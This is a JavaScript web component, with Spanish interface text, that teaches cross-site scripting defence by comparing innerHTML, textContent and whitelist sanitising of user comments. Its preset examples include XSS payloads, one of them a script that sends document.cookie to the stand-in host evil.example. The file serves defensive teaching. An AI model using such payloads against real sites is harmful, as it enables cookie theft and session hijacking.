import { inspectHtml, MAX_INPUT, sanitizeHtml } from '../lib/html';
import { define, h, PixelElement } from './base';

const PRESETS = [
	{ label: 'Imagen con onerror', html: '<img src="x" onerror="alert(\'XSS\')">¡Hola!' },
	{ label: 'Enlace javascript:', html: '<a href="javascript:alert(document.cookie)">Gana un premio</a>' },
	{ label: '<script>', html: '<p>Comentario</p><script>fetch("https://evil.example?c=" + document.cookie)</script>' },
	{ label: 'Formato legítimo', html: 'Me gusta el <b>pixel art</b> y <a href="https://astro.build">Astro</a>.' },
];

const CSS = `
.grid { display: grid; gap: 0.7rem; }
.presets { display: flex; flex-wrap: wrap; gap: 0.35rem; }
textarea { min-height: 4.5rem; resize: vertical; font-size: 1.1rem; }
.outputs { display: grid; gap: 0.6rem; }
@container (min-width: 44rem) { .outputs { grid-template-columns: repeat(3, minmax(0, 1fr)); } }
:host { container-type: inline-size; }
h4 { margin: 0 0 0.4rem; font-family: var(--font-pixel); font-size: 0.5rem; line-height: 1.6; }
.bad h4 { color: var(--color-px-O); }
.text h4 { color: var(--color-px-c); }
.good h4 { color: var(--color-px-l); }
.tree { display: grid; gap: 0.15rem; font-size: 1.05rem; }
.line { padding-left: calc(var(--depth) * 0.9rem); word-break: break-all; }
.attr.danger { background: color-mix(in srgb, var(--color-px-r), transparent 60%); }
.warnings { margin: 0.4rem 0 0; padding-left: 1rem; font-size: 1rem; }
.literal { white-space: pre-wrap; word-break: break-all; font-size: 1.05rem; }
.rendered { font-size: 1.15rem; }
.rendered a { color: var(--color-px-u); }
.counter { font-size: 0.95rem; text-align: right; }
`;

/**
 * <xss-lab>: lo que pasaría con el mismo texto según cómo se inserte.
 * El HTML del usuario nunca llega a la página: se analiza en un documento
 * inerte (DOMParser) y el saneado crea nodos nuevos desde cero.
 */
class XssLab extends PixelElement {
	#textarea = h('textarea', {
		id: 'xss-input',
		maxlength: MAX_INPUT,
		spellcheck: 'false',
		autocomplete: 'off',
		'aria-describedby': 'xss-count',
	});
	#count = h('p', { id: 'xss-count', class: 'counter muted' });
	#tree = h('div', { class: 'tree' });
	#literal = h('p', { class: 'literal' });
	#rendered = h('div', { class: 'rendered' });
	#removed = h('p', { class: 'muted' });
	#frame = 0;

	constructor() {
		super(CSS);
		this.#textarea.value = PRESETS[0].html;
		this.root.append(
			h(
				'div',
				{ class: 'grid' },
				h(
					'div',
					{},
					h('label', { class: 'label', for: 'xss-input' }, 'Comentario que envía un usuario'),
					this.#textarea,
					this.#count,
				),
				h(
					'div',
					{ class: 'presets', role: 'group', 'aria-label': 'Ejemplos' },
					...PRESETS.map((p) => {
						const b = h('button', { type: 'button' }, p.label);
						b.addEventListener('click', () => {
							this.#textarea.value = p.html;
							this.#schedule();
						});
						return b;
					}),
				),
				h(
					'div',
					{ class: 'outputs' },
					h('section', { class: 'box bad' }, h('h4', {}, '✗ innerHTML: lo que se ejecutaría'), this.#tree),
					h('section', { class: 'box text' }, h('h4', {}, '✓ textContent: se ve como texto'), this.#literal),
					h('section', { class: 'box good' }, h('h4', {}, '✓ Saneado con lista blanca'), this.#rendered, this.#removed),
				),
				h(
					'p',
					{ class: 'muted' },
					'Segunda barrera: una cabecera Content-Security-Policy sin unsafe-inline impide que el navegador ejecute scripts en línea aunque alguno se cuele.',
				),
			),
		);
		this.#textarea.addEventListener('input', () => this.#schedule());
		this.#render();
	}

	/** Agrupa las pulsaciones de un mismo fotograma en un único análisis. */
	#schedule() {
		cancelAnimationFrame(this.#frame);
		this.#frame = requestAnimationFrame(() => this.#render());
	}

	#render() {
		const html = this.#textarea.value.slice(0, MAX_INPUT);
		this.#count.textContent = `${html.length} / ${MAX_INPUT}`;

		// 1. innerHTML: el árbol que crearía el navegador, pintado como TEXTO
		const nodes = inspectHtml(html);
		const warnings = nodes.flatMap((n) => [
			...(n.danger ? [`<${n.tag}> ${n.danger}`] : []),
			...n.attrs.filter((a) => a.danger).map((a) => `${a.name} ${a.danger}`),
		]);
		this.#tree.replaceChildren(
			...(nodes.length
				? nodes.map(renderLine)
				: [h('p', { class: 'muted' }, 'Solo texto: no crearía ningún elemento.')]),
			warnings.length
				? h('ul', { class: 'warnings danger' }, ...warnings.map((w) => h('li', {}, w)))
				: h('p', { class: 'ok' }, 'Nada ejecutable a la vista.'),
		);

		// 2. textContent: el texto tal cual, sin interpretar
		this.#literal.textContent = html;

		// 3. Saneado: nodos nuevos, creados solo a partir de la lista blanca
		const { fragment, removed } = sanitizeHtml(html);
		this.#rendered.replaceChildren(fragment);
		this.#removed.textContent = removed.length ? `Eliminado: ${removed.join(', ')}.` : 'No ha hecho falta quitar nada.';
	}
}

function renderLine(node) {
	const line = h(
		'div',
		{ class: `line mono${node.danger ? ' danger' : ''}` },
		`<${node.tag}`,
		...node.attrs.flatMap((a) => [
			' ',
			h(
				'span',
				{ class: a.danger ? 'attr danger' : 'attr' },
				`${a.name}="${a.value.length > 60 ? `${a.value.slice(0, 60)}…` : a.value}"`,
			),
		]),
		'>',
	);
	// Por CSSOM y no con un atributo style: una CSP estricta bloquea los style en línea
	line.style.setProperty('--depth', String(node.depth));
	return line;
}

define('xss-lab', XssLab);
